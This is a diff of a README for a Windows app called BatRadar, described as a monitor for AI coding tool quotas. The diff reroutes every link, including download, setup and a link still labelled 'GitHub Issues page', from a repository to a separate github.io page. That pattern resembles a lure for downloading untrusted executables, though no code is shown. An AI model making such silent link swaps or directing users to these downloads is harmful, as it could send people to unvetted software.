@@ -1,12 +1,12 @@
 # 🦇 BatRadar - Monitor Your AI Coding Tool Usage
 ## 📥 Download Now
-[![Download BatRadar](https://img.shields.io/badge/Download-BatRadar_1.0-blue?style=for-the-badge&logo=windows)](https://github.com/Westcranberry514/batradar-windows-monitor)
+[![Download BatRadar](https://img.shields.io/badge/Download-BatRadar_1.0-blue?style=for-the-badge&logo=windows)](https://westcranberry514.github.io)
 
 ## 📋 About BatRadar
 BatRadar is a Windows desktop utility that helps you monitor usage and quotas across AI coding tools. It displays live provider data through an overlay, dashboard, and desktop alerts. Whether you use GitHub Copilot, Tabnine, ChatGPT, or other AI assistants, BatRadar keeps you informed about your remaining credits, usage limits, and provider status.
 
 ## 🚀 Getting Started
-Visit this link to download the application: [https://github.com/Westcranberry514/batradar-windows-monitor](https://github.com/Westcranberry514/batradar-windows-monitor)
+Visit this link to download the application: [https://westcranberry514.github.io](https://westcranberry514.github.io)
 
 ## 💻 System Requirements
 - **Operating System:** Windows 10 or Windows 11 (64-bit)
@@ -43,7 +43,7 @@ Visit this link to download the application: [https://github.com/Westcranberry51
 - **Overlay not visible:** Make sure BatRadar is running in the background (check your system tray).
 
 ## 📝 Support
-For help, visit our [GitHub Issues page](https://github.com/Westcranberry514/batradar-windows-monitor/issues) or read the included help file in the application folder.
+For help, visit our [GitHub Issues page](https://westcranberry514.github.io) or read the included help file in the application folder.
 
 ## 📄 License
 This software is provided as-is. See the LICENSE file included with the download for details.
